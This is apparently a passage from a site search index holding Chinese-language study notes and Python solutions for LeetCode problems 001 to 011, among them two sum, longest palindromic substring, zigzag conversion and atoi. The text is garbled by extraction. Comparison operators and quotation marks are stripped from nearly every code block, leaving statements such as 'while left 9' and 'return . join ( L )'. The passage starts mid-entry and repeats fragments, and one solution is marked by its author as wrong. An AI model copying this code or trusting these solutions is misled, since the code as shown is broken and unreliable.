and ls[i].isdigit(): # ret = ret * 10 + ord(ls[i]) - ord( 0 ) # i += 1 # return max(-2 ** 31, min(sign * ret, 2 ** 31 - 1)) print ( Solution () . myAtoi ( 123 )) 009 \u5224\u65ad\u4e00\u4e2a\u6570\u5b57\u662f\u5426\u662f\u56de\u6587\u6570\u5b57 \u8981\u6c42\u662f\u4e0d\u7528toString\u7684\u65b9\u5f0f \u60f3\u6cd5 \u7528\u6570\u5b66\u7684\u65b9\u5f0f\uff1f \u90a3\u4e48\u56de\u6587\u6570\u5b57\u672c\u8eab\u6709\u4ec0\u4e48\u6027\u8d28\uff1f \u966410\u540e\u5165\u6808\uff1f 12323432321 \u7531\u4e24\u7aef\u5411\u4e2d\u5fc3\u79fb\u52a8\uff1f * \u5de6\u7aef\u966410\uff0c\u53f3\u7aef%10 * \u79fb\u52a8\uff1f\u8bb0\u5f55\u6700\u5927\u4f4d\uff1f\u6700\u5927\u4f4d\u53ef\u5728\u5faa\u73af\u65f6\u5019\u8bb0\u5f55 * \u5de6\u7aef a//div % 10 * \u53f3\u7aef a//div % 10 \u7528\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f \u56de\u6587\u5b57\u7b26\u4e32 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def isPalindrome ( self , x ): :type x: int :rtype: bool left , div = x , 1 while left 9 : left = left // 10 div = div * 10 left_div , right_div = div , 1 while x // left_div % 10 == x // right_div % 10 and ( left_div != right_div and left_div != right_div * 10 ): left_div /= 10 right_div *= 10 return x // left_div % 10 == x // right_div % 10 if x = 0 else False \u5176\u4ed6 1 2 3 4 5 6 7 8 9 class Solution : def isPalindrome ( self , x ): div , tmp = 1 , x while tmp = 10 : tmp //= 10 div *= 10 while x and x % 10 == x // div : x , div = x % div // 10 , div // 100 return not x 010 Todo \u5b9e\u73b0\u4e00\u4e2a\u6b63\u5219\u89e3\u6790\u5668","title":"001 010"},{"location":"LeetCode/vol 0/001-010/#001","text":"\u4f7f\u7528\u67e5\u8868\u7684\u65b9\u5f0f\u5f88\u5bb9\u6613\u5f97\u51fa","title":"001"},{"location":"LeetCode/vol 0/001-010/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 class Solution ( object ): def twoSum ( self , nums , target ): :type nums: List[int] :type target: int :rtype: List[int] vis = {} for i , num in enumerate ( nums ): diff = target - num if diff in vis : return [ vis [ diff ], i ] vis [ num ] = i","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#002","text":"\u94fe\u8868\u6c42\u548c\uff0c\u4e00\u5f00\u59cb\u4f7f\u7528\u4e86\u7b80\u5355\u7c97\u66b4\u7684\u65b9\u6cd5\uff0c\u5148\u6c42\u6bcf\u4e2a\u94fe\u8868\u7684\u503c\uff0c\u518d\u6c42\u548c\uff0c\u63a5\u7740\u8f6c\u6362\u6210\u94fe\u8868","title":"002"},{"location":"LeetCode/vol 0/001-010/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 def getNum ( listNode ): listNode_sum = 0 iter = 1 while listNode : listNode_sum += listNode . val * iter iter *= 10 listNode = listNode . next return listNode_sum def transform ( nums ): ans = ListNode ( nums % 10 ) p = ans nums //= 10 while nums : p . next = ListNode ( nums % 10 ) p = p . next nums //= 10 return ans \u53ef\u7ee7\u7eed\u63d0\u9ad8","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : # @return a ListNode def addTwoNumbers ( self , l1 , l2 ): carry = 0 root = n = ListNode ( 0 ) while l1 or l2 or carry : v1 = v2 = 0 if l1 : v1 = l1 . val l1 = l1 . next if l2 : v2 = l2 . val l2 = l2 . next carry , val = divmod ( v1 + v2 + carry , 10 ) n . next = ListNode ( val ) n = n . next return root . next","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/001-010/#003","text":"\u6c42\u5b57\u7b26\u4e32 \u4e0d\u5305\u62ec\u91cd\u590d\u5b57\u7b26\u7684\u6700\u957f\u5b50\u4e32\u7684 \u957f\u5ea6 \u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32 1 2 3 4 Given a string, find the length of the longest substring without repeating characters. Input: abcabcbb Output: 3 Explanation: The answer is abc , with the length of 3. \u60f3\u6cd5 \u89e3\u6cd5\uff1aDP\u7b97\u6cd5 \u77e9\u9635\u5e94\u8be5\u662f\u4ec0\u4e48\uff0c\u72b6\u6001\u8f6c\u79fb\u65b9\u7a0b\u662f\u4ec0\u4e48\uff1f \u5047\u8bbe\u662f\u4e00\u4e2alist\u5b58\u653e\u72b6\u6001\uff0c\u8be5list\u7684\u6bcf\u4e2a\u5143\u7d20\u4ee3\u8868\u5bf9\u5e94 \u4ee5\u8be5\u5b57\u7b26\u7ed3\u675f\u7684\u5b57\u7b26\u4e32\u7684\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32\u7684\u957f\u5ea6\uff1f \u90a3\u4e48\u4e0b\u4e00\u4e2a\u5143\u7d20\u53ef\u5426\u4f7f\u7528\u4e4b\u524d\u7684\u5143\u7d20\u7684\u4fe1\u606f\uff1f 1 2 3 4 5 6 7 # \u4ee5\u8be5\u5b57\u7b26\u7ed3\u675f\u7684\u5b57\u7b26\u4e32\u7684\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32\u7684\u957f\u5ea6\uff1f # \u90a3\u4e48\u662f\u5426\u9700\u8981\u4e00\u4e2a\u8868\u8bb0\u5f55\u51fa\u73b0\u7684\u4f4d\u7f6e\uff1f # \u5f53\u51fa\u73b0\u91cd\u590d\u7684\u5b57\u7b26\u65f6\uff0c\u67e5\u627e\u4e4b\u524d\u5728\u4e0a\u4e00\u8f6e\u7684\u5bf9\u5e94\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u8ba1\u7b97\u8fd9\u4e00\u8f6e\u7684\u4e0d\u91cd\u590d\u5b57\u7b26\u7684\u5b50\u4e32\u957f\u5ea6\uff0c # \u90a3\u4e48\u5982\u4f55\u8ba1\u7b97\u957f\u5ea6 # \u5f97\u5230\u91cd\u590d\u5b50\u7b26\u7684\u4f4d\u7f6e\uff0c\u5f80\u524d\u67e5\u627e \u4e0a\u4e00\u8f6e\u7684 t m m z u x t","title":"003"},{"location":"LeetCode/vol 0/001-010/#_4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class Solution : def lengthOfLongestSubstring ( self , s ): :type s: str :rtype: int maxLength = 0 start = 0 # todo \u8be5\u5b57\u5178\u9700\u8981\u4e00\u4e2a\u66f4\u597d\u7684\u540d\u5b57 subStringDic = {} for index , currentChar in enumerate ( s ): if currentChar in subStringDic and subStringDic [ currentChar ] = start : # \u53d1\u751f\u91cd\u590d\u7684\u5b57\u7b26\uff0c\u91cd\u65b0\u8ba1\u7b97\u65b0\u4e00\u8f6e\u7684\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32 # \u540c\u65f6\uff0c\u786e\u4fdd\u91cd\u590d\u7684\u5b57\u7b26\u4e32\u8981\u5927\u4e8estart\uff0c\u5982 tmmzuxt # \u8be5\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u5927\u4e8e\u540e\uff0c\u9047\u5230\u6700\u540e\u4e00\u4e2at\u65f6\uff0c\u5c31\u8fdb\u5165\u5224\u65ad\u8bed\u53e5\uff0cstart=0+1=1\u4e86\uff0c\u6ca1\u6709\u8ba1\u7b97\u5230t start = subStringDic [ currentChar ] + 1 else : # \u4e0d\u91cd\u590d\uff0c\u4e0e\u4e4b\u524d\u8bb0\u5f55\u7684\u6700\u5927\u503c\u505a\u6bd4\u8f83\uff0c\u9700\u8981\u66f4\u65b0\u6700\u5927\u503c maxLength = max ( index - start + 1 , maxLength ) subStringDic [ currentChar ] = index return maxLength","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#004","text":"E \u627e\u5230\u4e24\u4e2a\u6392\u5e8f\u6570\u7ec4\u7684\u4e2d\u4f4d\u6570\uff0c\u4e00\u5f00\u59cb\u662f\u60f3set\u540e\u6c42\u5e76\u7136\u540esort\u76f4\u63a5\u8f93\u51fa\u4e2d\u4f4d\u6570\uff0c\u7136\u540e\u53d1\u73b0\u8fd9\u6837\u7684\u4e2d\u4f4d\u6570\u5e76\u4e0d\u662f\u539f\u5148\u4e24\u4e2a\u6570\u7ec4\u7684\u4e2d\u4f4d\u6570\uff0c\u6240\u4ee5\u8be5\u601d\u8def\u653e\u5f03 \u90a3\u4e48\u9700\u8981\u4e0b\u66b4\u529b\u7684\u65b9\u6cd5\u6765\u8f93\u51fa\u4e2d\u4f4d\u6570\uff1f \u7531\u4e8e\u662f\u4e2d\u4f4d\u6570\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u53ef\u80fd","title":"004"},{"location":"LeetCode/vol 0/001-010/#_5","text":"","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#005","text":"\u7ed9\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6c42\u5f97\u4e00\u4e2a\u6700\u957f\u7684\u5b50\u56de\u6587\u5b57\u7b26\u4e32 Given a string s, find the longest palindromic substring in s. You may assume that the maximum length of s is 1000 1 2 3 Input: babad Output: bab Note: aba is also a valid answer. \u60f3\u6cd5 \u8981\u6c42\u662f\u8fd4\u56de\u4e00\u4e2a\u6700\u957f\u7684\u5b50\u56de\u6587\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u9700\u8981\u6ce8\u610f\u7684\u662f \u56de\u6587\u4e32\u7684\u5f62\u5f0f aba aa \u6700\u957f\u5b50\u56de\u6587\u4e32\u7684\u8d77\u59cb\u5730\u5740\u4e0e\u5176\u504f\u79fb\u3001\u7ed3\u675f\u5730\u5740 \u90a3\u4e48\uff0c\u80fd\u5426\u4f7f\u7528\u9996\u5c3e\u4e24\u4e2a\u6307\u9488\u6765\u5411\u4e2d\u5fc3\u79fb\u52a8\u5462\uff1f \u60f3\u4e86\u4e0b\u5927\u6982\u4e0d\u884c\uff0c\u4f8b\u5b50\u5982 ababvda \u6216\u8005\u52a0\u5165DP\u7684\u601d\u60f3\uff1f\u6240\u4ee5\u9700\u8981\u4e00\u4e2a\u65b0\u7684\u5bb9\u5668\u5b58\u653e\u72b6\u6001\uff0c\u8be5\u72b6\u6001\u53ef\u4ee5\u662f\uff1f \u4e00\u7ef4\u6570\u7ec4\uff0c\u72b6\u6001\u8868\u793a\u4ee5\u5f53\u524d\u5b57\u7b26\u5f00\u59cb\u7684\u56de\u6587\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff1f\u6216\u662f\u4ee5\u8be5\u5b57\u7b26\u4e3a\u4e2d\u5fc3\u7684\u957f\u5ea6\uff1f \u611f\u89c9\u4ee5\u8be5\u5b57\u7b26\u4e3a\u4e2d\u5fc3\u957f\u5ea6\u53ef\u884c\uff0c\u4f46\u4e0d\u9002\u7528\u4e0eaaaa\u8fd9\u6837\u5076\u6570\u957f\u5ea6\u56de\u6587\u4e32\uff0c\u6216\u8005\u53ef\u4ee5\u5206\u60c5\u51b5\u8ba8\u8bba \u4e8c\u7ef4\u77e9\u9635\uff1fi\u3001j\u8fd9\u4e24\u5b57\u7b26\u4e4b\u95f4\u662f\u5426\u6709\u56de\u6587\u5b57\u7b26\uff1f","title":"005"},{"location":"LeetCode/vol 0/001-010/#_6","text":"\u4f7f\u7528\u4e8c\u7ef4\u6570\u7ec4\u8bb0\u5f55\u72b6\u6001\uff0cdp[i][j]\u8868\u793ai,j\u4e4b\u95f4\u662f\u5426\u662f\u56de\u6587 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution ( object ): def longestPalindrome ( self , s ): dp = [[ 0 ] * len ( s ) for i in range ( len ( s ))] ans = max_length = 0 # i\u5012\u8fc7\u6765\u8ba1\u7b97\u662f\u4e3a\u4e86\u4ece\u5b57\u7b26\u4e32\u5c0f\u5230\u5927 # \u5982\u679ci\u4ece\u5934\u5f00\u59cb\uff0c\u4f1a\u6f0f\u7b97\u60c5\u51b5 for i in range ( len ( s ) - 1 , - 1 , - 1 ): for j in range ( i , len ( s )): if s [ i ] == s [ j ] and ( j - i 3 or dp [ i + 1 ][ j - 1 ] == 1 ): dp [ i ][ j ] = 1 if ans == or max_length j - i + 1 : ans = s [ i : j + 1 ] max_length = j - i + 1 return ans","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#_7","text":"\u8fd9\u91cc\u662f\u4ece\u4e2d\u5fc3\u5411\u4e24\u8fb9\u6269\u5c55 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 class Solution ( object ): def longestPalindrome ( self , s ): length = len ( s ) center_odd = 0 center_even = 0 maxRadius = 0 maxLen = 0 if length 2 : return s # \u957f\u5ea6\u4e3a\u5947\u6570 for i in range ( length ): for j in range ( i , length ): # \u8fb9\u754c\u8d85\u51fa if i - ( j - i ) 0 : break # \u5411\u4e24\u8fb9\u6269\u5c55 elif s [ i - ( j - i )] != s [ j ]: break else : if j - i maxRadius : maxRadius = j - i center_odd = i # \u957f\u5ea6\u4e3a\u5076\u6570 for i in range ( length ): for j in range ( i + 1 , length ): # \u8fb9\u754c\u8d85\u51fa if i - ( j - i ) + 1 0 : break # \u5411\u4e24\u8fb9\u6269\u5c55 # center = i = 5 # j = 6, 7, 8, # cp= 5, 4, 3, elif s [ i - ( j - i ) + 1 ] != s [ j ]: break else : if 2 * ( j - i ) maxLen : maxLen = 2 * ( j - i ) center_even = i return s [ center_odd - maxRadius : center_odd + maxRadius + 1 ] if maxLen 2 * maxRadius + 1 else s [ center_even - ( maxLen // 2 ) + 1 : center_even + ( maxLen // 2 ) + 1 ]","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 0/001-010/#_8","text":"\u67e5\u627e\u4e86\u8d44\u6599\uff0c\u8fd8\u6709\u4e2a\u9a6c\u62c9\u8f66\u7b97\u6cd5 \u6240\u8c13\u9a6c\u62c9\u8f66\u7b97\u6cd5\uff08manacher\uff09\u662f \u53c2\u8003\u8d44\u6599 https://www.jianshu.com/p/7c3f074b380b","title":"\u6cd5\u4e09"},{"location":"LeetCode/vol 0/001-010/#_9","text":"Todo \u5206\u6790\u4e3a\u4f55\u51fa\u9519 \u8fd9\u91cc\u51fa\u9519\u4e86\uff0c\u4e0d\u77e5\u9053\u662f\u54ea\u91cc\u7684\u95ee\u9898 \u5df2\u77e5\u7684 i\u4ece\u5934\u5f00\u59cb\uff0c\u5b57\u7b26\u4e32\u5c3e\u90e8\u672a\u8003\u8651\u5230\uff0c\u5e94\u8be5\u4ece\u5c3e\u90e8\u5f00\u59cb \u7591\u8651\uff1a\u4e0d\u662f\u56de\u6587\u5417\uff1f\u4ece\u5934\u4ece\u5c3e\u4e0d\u662f\u4e00\u6837\u4e48? abbbbbba \u4ece\u5934 a ab bb \u4ece\u5c3e a ba bb bba \u5927\u6982\u5c31\u8fd9\u610f\u601d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 class Solution ( object ): def longestPalindrome ( self , s ): :type s: str :rtype: str length = len ( s ) if length 2 : return s dp = [[ False for _ in range ( length )] for _ in range ( length )] # dp[i][j]\u8868\u793a\u5b57\u7b26i,j\u4e4b\u95f4\u662f\u5426\u662f\u56de\u6587\u5b57\u7b26\u4e32 start = 0 maxlength = 0 for i in range ( length ): dp [ i ][ i ] = True for i in range ( length ): for j in range ( i + 1 , length ): # j - i 2 \u6ee1\u8db3 aa aba dp [ i ][ j ] = ( s [ i ] == s [ j ] and ( j - i 2 or dp [ i + 1 ][ j - 1 ])) if j - i + 1 maxlength and dp [ i ][ j ]: start = i maxlength = j - i + 1 return s [ start : start + maxlength + 1 ]","title":"\u9519\u8bef"},{"location":"LeetCode/vol 0/001-010/#_10","text":"Todo \u4e3a\u6bdb\u8fd9\u4e2a\u90a3\u4e48\u5febclass Solution ( object ): def longestPalindrome ( self , s ): :type s: str :rtype: str max_length = 0 start = 0 if s == s [:: - 1 ]: return s for i in range ( len ( s )): if i - max_length - 1 = 0 and s [ i - max_length - 1 : i + 1 ] == s [ i - max_length - 1 : i + 1 ][:: - 1 ]: start = i - max_length - 1 max_length += 2 # print(i,start, max_length) continue if i - max_length = 0 and s [ i - max_length : i + 1 ] == s [ i - max_length : i + 1 ][:: - 1 ]: start = i - max_length max_length += 1 # print(i,start,max_length) return s [ start : start + max_length ] # class Solution: # def longestPalindrome(self, s): # # :type s: str # :rtype: str # # max_length = 0 # start = 0 # if s == s[::-1]: # return s # # for i in range(len(s)): # if i - max_length - 1 = 0 and s[i - max_length - 1:i + 1] == s[i - max_length - 1:i + 1][::-1]: # start = i - max_length - 1 # max_length += 2 # continue # # if i - max_length = 0 and s[i - max_length:i + 1] == s[i - max_length:i + 1][::-1]: # start = i - max_length # max_length += 1 # return s[start:start + max_length] # Accept O(n) # def longestPalindrome(self, s): # size = len(s) # if size == 1: # return s # if size == 2: # if s[0] == s[1]: # return s # return s[0] # maxp = 1 # ans = s[0] # i = 0 # while i size: # j = i + 1 # # \u786e\u5b9a\u5185\u6838\uff0c\u5728\u540e\u9762\u4ee3\u7801\u4e2dj\u53ef\u4ee5\u81ea\u52a8\u9002\u5e94\u5947\u6570\u5b50\u4e32\u548c\u5076\u6570\u5b50\u4e32 # while j size: # if s[i] == s[j]: # j += 1 # else: # break # k = 0 # # \u5bf9\u79f0\u6269\u5c55 # while i - k - 1 = 0 and j + k = size - 1: # if s[i- k - 1] != s[j + k]: # break # k += 1 # if j - i + 2*k maxp: # maxp = j- i + 2*k # ans = s[i - k:j + k] # if j + k == size - 1: # break # i = j # return ans # TLE O(n^2) # def longestPalindrome(self, s): # if(len(s) =1): # return s # if(len(s)==2): # return s[0] if s[0]!=s[1] else s # # s = s[::-1] # start = 0 # max_len = 1 # length = len(s) # P = [[False for i in range(length)] for i in range(length)] # for i in range(length): # P[i][i] = True # if i (length-1) and s[i]==s[i+1]: # P[i][i+1] = True # start = i # max_len = 2 # for l in range(3,length+1): # for i in range(0,length-l+1): # j = i + l -1 # if P[i+1][j-1] and s[i]==s[j]: # P[i][j] = True # if l max_len: # max_len = l # start = i # return s[start:start+max_len] # TLE O(n^3) # def longestPalindrome(self, s): # # :type s: str # :rtype: str # # if len(s) = 1: # return s # st = 0 # ln = len(s) # re_s = 0 # re_l = 1 # while (st + re_l) = len(s): # while ln re_l: # if self.is_palindrome(s[st:st + ln]) and ln re_l: # print(s[st:st + ln]) # re_s, re_l = st, ln # ln -= 1 # st += 1 # ln = len(s) - st # return s[re_s:re_s + re_l] # def is_palindrome(self, s): # if len(s) == 1: # return True # step = len(s)//2 # for i in range(step): # if s[i] == s[-(i+1)]: # continue # else: # return False # return True # class Solution: # def longestPalindrome(self, s): # # :type s: str # :rtype: str # # maxlen = 1 # start = 0 # if len(s) == 1: # return s # for i in range(len(s)): # lo = i - 1 # hi = i + 1 # while lo = 0 and hi len(s) and s[lo] == s[hi]: # if hi - lo + 1 maxlen: # maxlen = hi - lo + 1 # start = lo # lo -= 1 # hi += 1 # # for i in range(len(s)): # loo = i # hii = i + 1 # while loo = 0 and hii len(s) and s[loo] == s[hii]: # if hii - loo + 1 maxlen: # maxlen = hii - loo + 1 # start = loo # loo -= 1 # hii += 1 # # return s[start:start + maxlen] So = Solution () print ( So . longestPalindrome ( babad )) print ( abcab [ 0 : 0 ])","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/001-010/#006","text":"\u5c06\u5355\u8bcd\u4ee5Z\u5b57\u5f62\u8f93\u51fa\uff0c\u5982 1 2 3 4 5 6 7 8 Input: s = PAYPALISHIRING , numRows = 4 Output: PINALSIGYAHRPI Explanation: P I N A L S I G Y A H R P I 4\u884c\u8f93\u51fa \u60f3\u6cd5 \u6211\u89c9\u5f97\u5c31\u662f\u66b4\u529b\u505a\u6cd5 \u9996\u5148\u662f\u7279\u6b8a\u7684\u884c\u6570\uff0c\u5982nrow=1 \uff0cnrow len(str) \u7136\u540e\u600e\u4e48\u751f\u6210\u5b57\u7b26\u4e32\uff1f \u9996\u5148\u60f3\u5230\u7684\u662f\u4e8c\u7ef4\u6570\u7ec4 \u7136\u540e\u662f\u4e00\u6a2a\u4e00\u6a2a\u7684\u7684\u9644\u52a0\u4e0a\u53bb 1 2 3 4 5 6 7 8 9 10 11 # nrow = 5 str 0 1 2 3 4 5 6 7 8 9 tmp 0 1 2 3 4 3 2 1 0 1 # nrow = 4 str 0 1 2 3 4 5 6 7 8 9 tmp 0 1 2 3 2 1 0 1 2 3 # nrow = 3 str 0 1 2 3 4 5 6 7 8 9 tmp 0 1 2 1 0 1 2 1 0 1 \u901a\u8fc7\u89c2\u5bdf\uff0c\u5f97\u5230\u6620\u5c04\u5173\u7cfb\uff1f \u6216\u8bb8\u4e0d\u7528\uff1f","title":"006"},{"location":"LeetCode/vol 0/001-010/#_11","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Solution : def convert ( self , s , numRows ): if numRows == 1 or numRows = len ( s ): return s L = [ ] * numRows index , step = 0 , 1 for x in s : L [ index ] += x if index == 0 : step = 1 elif index == numRows - 1 : step = - 1 index += step return . join ( L )","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#_12","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class Solution : def convert ( self , s , numRows ): :type s: str :type numRows: int :rtype: str if numRows == 1 : return s ansList = [] gap = 2 * numRows - 2 for i in range ( numRows ): temp1 = i temp2 = gap - i if temp1 == 0 or temp1 == numRows - 1 : while temp1 len ( s ): ansList . append ( s [ temp1 ]) temp1 += gap else : while temp1 len ( s ): ansList . append ( s [ temp1 ]) temp1 += gap if temp2 len ( s ): ansList . append ( s [ temp2 ]) temp2 += gap return . join ( ansList )","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/001-010/#007","text":"\u7ffb\u8f6c\u6570\u5b57 \u867d\u7136\u8bf4\u53ef\u4ee5\u7528python\u672c\u8eab\u7684\u7279\u6027\u6765\u505a\uff0c\u4f46\u6211\u89c9\u5f97\u8fd8\u662f\u7528c\u7684\u65b9\u5f0f\u505a\u6bd4\u8f83\u597d","title":"007"},{"location":"LeetCode/vol 0/001-010/#_13","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def reverse ( self , x ): :type x: int :rtype: int isNegative = False if x 0 : x = - x isNegative = True val = 0 while x != 0 : val = val * 10 + x % 10 x = int ( x / 10 ) res = - val if isNegative else val if res pow ( 2 , 31 ) - 1 or res - pow ( 2 , 31 ): return 0 return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#_14","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def reverse ( self , x ): :type x: int :rtype: int if x 0 : y = - 1 * int ( str ( - x )[:: - 1 ]) else : y = int ( str ( x )[:: - 1 ]) if y 2147483647 or y - 2147483647 : y = 0 return y","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/001-010/#008","text":"\u5b9e\u73b0atoi\u51fd\u6570\uff0cstring\u8f6c\u6362\u6210int\u53d8\u91cf \u56de\u60f3\u4e4b\u524datoi\u51fd\u6570\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u529f\u80fd \u53ea\u8bfb\u53d6\u7b2c\u4e00\u4e2a\u53ef\u88ab\u8f6c\u6362\u6210\u6570\u5b57\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u9996\u5b57\u7b26\u662f\u7a7a\u683c\u4ee5\u5916\u7684\u5b57\u7b26\u62a5\u9519 \u8bfb\u53d6 - + \u53f7 \u8fd4\u56deINT","title":"008"},{"location":"LeetCode/vol 0/001-010/#_15","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 class Solution ( object ): def myAtoi ( self , str ): :type str: str :rtype: int def isDigit ( char ): if ( 0x30 = ord ( char ) and ord ( char ) = 0x39 ): return True return False if len ( str ) == 0 : return 0 INT_MAX = 2147483647 INT_MIN = - 2147483648 res = 0 start_index = 0 isNegative = False while start_index len ( str ) and str [ start_index ] == : start_index += 1 while start_index len ( str ): if str [ start_index ] == - : isNegative = True start_index += 1 elif str [ start_index ] == + : start_index += 1 while start_index len ( str ) and isDigit ( str [ start_index ]): res = res * 10 + ord ( str [ start_index ]) - 0x30 start_index += 1 if isNegative : res = - res if res INT_MAX : return INT_MAX elif res INT_MIN : return INT_MIN return res return 0","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#_16","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 class Solution ( object ): def myAtoi ( self , str ): :type str: str :rtype: int INT_MAX = 2147483647 INT_MIN = - 2147483648 index = 0 total = 0 sign = 1 # remove the space if len ( str ) == 0 : return 0 while index len ( str ) and str [ index ] == : index += 1 if index len ( str ): if str [ index ] == - : sign = - 1 index += 1 elif str [ index ] == + : index += 1 while index len ( str ): digit = ord ( str [ index ]) - ord ( 0 ) if digit 0 or digit 9 : return total * sign if INT_MAX / 10 sign * total or - (( - INT_MIN ) / 10 ) sign * total or ( INT_MAX / 10 == sign * total and INT_MAX % 10 digit ) or ( - (( - INT_MIN ) / 10 ) == sign * total and ( - INT_MIN ) % 10 digit ): if sign == 1 : return INT_MAX else : return INT_MIN total = total * 10 + digit index += 1 return total * sign # class Solution: # def myAtoi(self, str): # # :type str: str # :rtype: int # # if len(str) == 0: # return 0 # ls = list(str.strip()) # sign = -1 if ls[0] == - else 1 # if ls[0] in [ - , + ]: del ls[0] # ret, i = 0, 0 # while i len(ls) and ls[i].isdigit(): # ret = ret * 10 + ord(ls[i]) - ord( 0 ) # i += 1 # return max(-2 ** 31, min(sign * ret, 2 ** 31 - 1)) print ( Solution () . myAtoi ( 123 ))","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/001-010/#009","text":"\u5224\u65ad\u4e00\u4e2a\u6570\u5b57\u662f\u5426\u662f\u56de\u6587\u6570\u5b57 \u8981\u6c42\u662f\u4e0d\u7528toString\u7684\u65b9\u5f0f \u60f3\u6cd5 \u7528\u6570\u5b66\u7684\u65b9\u5f0f\uff1f \u90a3\u4e48\u56de\u6587\u6570\u5b57\u672c\u8eab\u6709\u4ec0\u4e48\u6027\u8d28\uff1f \u966410\u540e\u5165\u6808\uff1f 12323432321 \u7531\u4e24\u7aef\u5411\u4e2d\u5fc3\u79fb\u52a8\uff1f * \u5de6\u7aef\u966410\uff0c\u53f3\u7aef%10 * \u79fb\u52a8\uff1f\u8bb0\u5f55\u6700\u5927\u4f4d\uff1f\u6700\u5927\u4f4d\u53ef\u5728\u5faa\u73af\u65f6\u5019\u8bb0\u5f55 * \u5de6\u7aef a//div % 10 * \u53f3\u7aef a//div % 10 \u7528\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f \u56de\u6587\u5b57\u7b26\u4e32","title":"009"},{"location":"LeetCode/vol 0/001-010/#_17","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def isPalindrome ( self , x ): :type x: int :rtype: bool left , div = x , 1 while left 9 : left = left // 10 div = div * 10 left_div , right_div = div , 1 while x // left_div % 10 == x // right_div % 10 and ( left_div != right_div and left_div != right_div * 10 ): left_div /= 10 right_div *= 10 return x // left_div % 10 == x // right_div % 10 if x = 0 else False","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 0/001-010/#_18","text":"1 2 3 4 5 6 7 8 9 class Solution : def isPalindrome ( self , x ): div , tmp = 1 , x while tmp = 10 : tmp //= 10 div *= 10 while x and x % 10 == x // div : x , div = x % div // 10 , div // 100 return not x","title":"\u5176\u4ed6"},{"location":"LeetCode/vol 0/001-010/#010","text":"Todo \u5b9e\u73b0\u4e00\u4e2a\u6b63\u5219\u89e3\u6790\u5668","title":"010"},{"location":"LeetCode/vol 0/011-020/","text":"011 \u6839\u636e\u6240\u7ed9\u7684\u6570\u503c\uff0c\u8fd4\u56de\u6309\u7167\u8fd9\u4e2a\u6570\u503c\u6240\u6784\u6210\u7684\u6700\u591a\u7684\u5bb9\u5668\u7684\u5bb9\u79ef \u8b6c\u5982\u4e0a\u56fe 7 \\times 8=56 7 \\times 8=56 \u60f3\u6cd5 \u5f97\u5230\u5bb9\u79ef\u9700\u8981\u4e24\u4e2a\u503c\uff0c\u66b4\u529b\u7684\u505a\u6cd5\u662f\u904d\u5386 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def maxArea ( self , height ): :type height: List[int] :rtype: int res = 0 for i in range ( len ( height )): for j in range ( i + 1 , len ( height )): tmp = min ( height [ i ], height [ j ]) * ( j - i ) res = max ( res , tmp ) return res \u60f3\u8981\u806a\u660e\u4e00\u70b9\u5f97\u5230\u5bb9\u5668\u7684\u5bb9\u79ef\u9700\u8981 DP\uff1f \u90a3\u4e48\u5982\u4f55\u8bb0\u5f55\u503c\u5462\uff1f\u72b6\u6001\u751f\u6210\u5f0f\u662f\uff1f dp[]? dp[i]\u4e0e\u5176\u5339\u914d\u7684\u5750\u6807\uff1f- \u5982\u4f55\u8ba1\u7b97\uff0c min(height[i],height[dp[i-1]])*abs(i-dp[i-1]),? 